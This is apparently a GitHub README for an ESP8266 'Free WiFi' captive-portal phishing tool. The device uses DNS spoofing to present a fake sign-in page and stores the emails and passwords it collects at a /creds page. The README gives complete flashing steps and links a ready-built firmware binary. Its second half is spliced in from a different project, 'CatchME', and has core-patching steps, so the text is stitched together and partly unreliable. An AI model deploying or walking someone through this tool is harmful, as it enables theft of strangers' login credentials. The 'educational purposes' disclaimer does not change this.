## World_of_Walkers 

``ESP8266 ATTACK PHISHING ``

# NodeMcu ESP8266 Fake sign in

   ## About this project
   ### WiFi captive portal for the NodeMCU (ESP8266 Module) with DNS spoofing.
  - A login page will appear when someone connects to this "Free WiFi".
  - It asks the user for an email and a password for a fake sign in.
  - The built-in LED will blink 3 times after the login process is completed by someone.<b>
```diff
! Warning! Saved passwords will disappear when you restart/power off the ESP8266(Nodemcu) 
```
<b>Note: If you want to see the stored credetials go to <a>"**http**://</a>yourcurrentwebsite.com<a>/creds</a>" or "**172.0.0.1**<a>/creds</a>"

## Screenshots

<table>
 <tr>
    <th>connect to Free internet</th>
    <th>redirect ➜ 172.0.0.1/</th> 
 </tr>
   
 <tr>
    <td><img width="250px" src="https://raw.githubusercontent.com/ShahriarShafin/NodeMcu-ESP8266_Fake_sign_in/master/images/connect.jpg" title="Creds"></td>
    <td><img width="250px" src="https://raw.githubusercontent.com/ShahriarShafin/NodeMcu-ESP8266_Fake_sign_in/master/images/login.jpg" title="Post"></td> 
 </tr>
 
 <tr>
   <th>172.0.0.1/post</th>
   <th>172.0.0.1/pass</th>
 </tr>
 
 <tr>
   <td><img width="250px" src="https://raw.githubusercontent.com/ShahriarShafin/NodeMcu-ESP8266_Fake_sign_in/master/images/login_successful.jpg" title="Creds"></td>
   <td><img width="250px" src="https://raw.githubusercontent.com/ShahriarShafin/NodeMcu-ESP8266_Fake_sign_in/master/images/victims.jpg" title="Creds"></td>
 </tr>
</table>


### Installation (ESP8266 Flasher - Easy way)

1. Download <a href="https://github.com/nodemcu/nodemcu-flasher"><b>ESP8266 Flasher</b></a>.

2. Download the <b><a href="https://github.com/ShahriarShafin/NodeMcu-ESP8266_Fake_sign_in/raw/master/release.bin">release.bin</b></a> file.

3. Open the ESP8266 Flasher and select the Node MCU port

<img width="80%" src="https://raw.githubusercontent.com/ShahriarShafin/NodeMcu-ESP8266_Fake_sign_in/master/images/1_port_selection.png">

4. Then, go to the config tab and select the .bin file you've just downloaded.

<img width="80%" src="https://raw.githubusercontent.com/ShahriarShafin/NodeMcu-ESP8266_Fake_sign_in/master/images/2_file_selection.png">

5. Finally, go back to the first tab and press "Flash"

6. Your Node MCU is ready!

## Installation (Arduino IDE)

1. Open your <a href="https://www.arduino.cc/en/main/software">Arduino IDE</a> and go to "File -> Preferences -> Boards Manager URLs" and paste the following link:
``http://arduino.esp8266.com/stable/package_esp8266com_index.json``
2. Go to "Tools -> Board -> Boards Manager", search "esp8266" and install esp8266
3. Go to "Tools -> Board" and select you board"
4. Download and open the sketch "<a href="https://github.com/BlueArduino20/ESP8266_WiFi_Captive_Portal_2.0/blob/master/ESP8266_WiFi_Captive_Portal_2.0.ino"><b>ESP8266_WiFi_Captive_Portal_2.0.ino</b></a>"
5. You can optionally change some parameters like the SSID name and texts of the page like title, subtitle, text body...
6. Upload the code into your board.
7. You are done!


## Disclaimer
- This project is for testing and educational purposes. 
- Use it only against your own networks and devices. 
- Neither the ESP8266, nor its SDK was meant or built for such purposes.   
- I don't take any responsibility for what you do with this program. 
- Bugs can occur!

#### Requirements
- ESP8266 Module
- ESP8266 Core library, must be version 2.0.0!
- ESP8266 Patch library
- ESP8266 Driver
    - Windows Users

        |CP210x|CH34x|
        |:---:|:---:|
        |[Download](Tools/drivers/CP210x.zip)|[Download](Tools/drivers/CH34x.zip)|
    - MacOS Users
        
        For the MacOS you can install driver using `brew`
        ```
        brew tap caskroom/drivers
        brew cask install silicon-labs-vcp-driver
        ```

ESP8266 board variants:

|CP210x|CH34x|
|:---:|:---:|
|<img src="Tools/assets/boards/CP210x-board.png" height="200px">|<img src="Tools/assets/boards/CH34x-board.png" height="200px">|             


### Using NodeMCU Flasher
1. [Download](https://github.com/nodemcu/nodemcu-flasher/raw/master/Win64/Release/ESP8266Flasher.exe) **NodeMCU Flasher**
2. [Download](https://github.com/HerwonoWr/CatchME/releases) the current firmware release (binary version)
3. Upload the firmware `.bin` file using **NodeMCU Flasher**
4. Connect your ESP8266 (making sure the correct drivers are installed) and open up the **NodeMCU Flasher**
5. Go to the `Advanced` tab and select the correct values for your board
6. Navigate to the `config` tab and click the gear icon for the first entry
7. Browse for the `.bin` file you just downloaded and click open
8. Switch back to the `Operation` tab and click <kbd>Flash(F)</kbd>

*Note: This guide is for Windows users*

### Using Arduino IDE
1. [Download](https://www.arduino.cc/en/Main/Software) and install **Arduino IDE**
2. [Download](https://github.com/HerwonoWr/CatchME/releases) the current firmware release (source version)
3. MacOS Users
    - Go to `Arduino` > `Preferences`
    - Add `http://arduino.esp8266.com/stable/package_esp8266com_index.json` to the **Additional Boards Manager URLs**
4. Windows Users
    - Go to `File` > `Preferences`
    - Add `http://arduino.esp8266.com/stable/package_esp8266com_index.json` to the **Additional Boards Manager URLs**
5. Go to `Tools` > `Board` > `Boards Manager`
6. Type in `esp8266`
7. Select version `2.0.0` and click on `Install` (**must be version 2.0.0!**)<img width="799" alt="image" src="https://user-images.githubusercontent.com/92375418/149002741-88a29dc0-b012-43ea-a794-72b0ab4cf740.png">

[Arduino IDE] - Boards Manager](Tools/assets/arduino-ide/boards-manager.png)
8. Patching ESP8266 v2.0.0 Core
    - Check your ESP8266 packages location
        - MacOS Users
            - Go to `Arduino` > `Preferences`

                Find your packages path location under text `More preferences can be edited directly in the file`
        - Windows Users
            - Go to `File` > `Preferences`

                Find your packages path location under text `More preferences can be edited directly in the file`
9. Copy patch files in the **esp8266-Patch** folder to the following locations

    |Patch File|Path Location|Folder|
    |---|---|:---:|
    |user_interface.h|[packages-location]`/packages/esp8266/hardware/esp8266/2.0.0/tools/sdk/include`|`include`|
    |ESP8266WiFi.cpp<br>ESP8266WiFi.h|[packages-location]`/packages/esp8266/hardware/esp8266/2.0.0/libraries/ESP8266WiFi/src`|`src`|
    |ESP8266HTTPUpdateServer.cpp|[packages-location]`/packages/esp8266/hardware/esp8266/2.0.0/libraries/ESP8266HTTPUpdateServer/src`|`src`|
10. Go to `CatchME` folder, and open `CatchME.ino` file in **Arduino IDE**
11. Select your ESP8266 board module *(this guide using NodeMCU 1.0 (ESP12-E Module))* and the right port
    - Go to `Tools` > `Board`, select the right board module
    - Go to `Tools` > `Port`, select the right port
12. Depending on your ESP8266 board, you may have to adjust the board configurations
    - Here is an example board configuration for *NodeMCU 1.0 (ESP12-E Module)*

        |Conf|Value|
        |---|---|
        |CPU Frequency|80Mhz|
        |Flash Size| 4M (3M SPIFFS)|
        |Upload Speed|115200|
13. Click <kbd>Upload</kbd>

   
## License
```
MIT License

Copyright (c) 2020 Shahriar Shafin

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
